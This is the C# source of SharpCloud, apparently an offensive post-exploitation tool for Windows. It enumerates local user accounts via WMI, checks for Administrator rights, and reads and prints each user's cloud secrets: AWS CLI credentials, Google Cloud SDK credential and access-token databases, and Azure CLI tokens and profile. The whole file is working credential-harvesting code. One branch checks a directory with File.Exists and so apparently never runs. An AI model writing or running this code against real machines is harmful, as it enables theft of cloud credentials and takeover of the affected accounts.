using System;
using System.IO;
using System.Management;
using System.Collections.Generic;
using System.Security.Principal;

namespace SharpCloud
{
    class Program
    {
        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


        public static List<string> GetUsers()
        {
            List<string> usernames = new List<string>();
            List<string> ignored_users = new List<string>();
            ignored_users.Add("DefaultAccount");
            ignored_users.Add("WDAGUtilityAccount");
            ignored_users.Add("Guest");

            SelectQuery sQuery = new SelectQuery("Win32_UserAccount");

            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(sQuery);
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    string strUser = Convert.ToString(mObject["Name"]);
                    if (!ignored_users.Contains(strUser))
                    {
                        usernames.Add(strUser);
                    }
                    else
                    {
                        Console.WriteLine($"[*] Ignoring the {strUser} account.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            return usernames;
        }


        static void CheckFile(string filename)
        {
            if (File.Exists(filename))
            {
                Console.WriteLine(Environment.NewLine + $"[*] Found {filename}:");
                string fileContents = File.ReadAllText(filename);
                Console.WriteLine(Environment.NewLine + Convert.ToString(fileContents));
            }
        }


        static void Main(string[] args)
        {
            // Get the current user and all usernames
            string currentUser = Environment.UserName;
            Console.WriteLine($"[+] Operating in the context of the {currentUser} user.");

            if (IsAdministrator())
            {
                Console.WriteLine("[*] Current user is an Administrator!");
            } else
            {
                Console.WriteLine("[!] Current user is NOT an Administrator! Cloud files for other users may not be returned.");
            }

            List<string> allUsers = GetUsers();

            foreach (var user in allUsers)
            {
                // Credential and config file locations in $HOME on Windows
                string awsKeyFile = String.Format(@"C:\Users\{0}\.aws\credentials", user);
                string computeLegacyCreds = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\legacy_credentials", user);
                string computeCredsDb = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\credentials.db", user);
                string computeAccessTokensDb = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\access_tokens.db", user);
                string azureTokens = String.Format(@"C:\Users\{0}\.azure\accessTokens.json", user);
                string azureProfile = String.Format(@"C:\Users\{0}\.azure\azureProfile.json", user);

                Console.WriteLine(Environment.NewLine + $"[+] Checking home directory for the {user} user:");

                Console.WriteLine("[+] Checking for awscli files...");
                CheckFile(awsKeyFile);

                Console.WriteLine(Environment.NewLine + "[+] Checking for Google Compute SDK files...");
                CheckFile(computeCredsDb);
                CheckFile(computeAccessTokensDb);
                if (File.Exists(computeLegacyCreds))
                {
                    string[] legacyCreds = Directory.GetFiles(computeLegacyCreds, "*.json", SearchOption.AllDirectories);
                    foreach (var file in legacyCreds)
                    {
                        CheckFile(file);
                    }
                }

                Console.WriteLine(Environment.NewLine + "[+] Checking for Azure CLI files...");
                CheckFile(azureTokens);
                CheckFile(azureProfile);
            }

            Console.WriteLine(Environment.NewLine + "[+] Job's done! Press Enter to continue.");
            Console.Read();
        }
    }
}
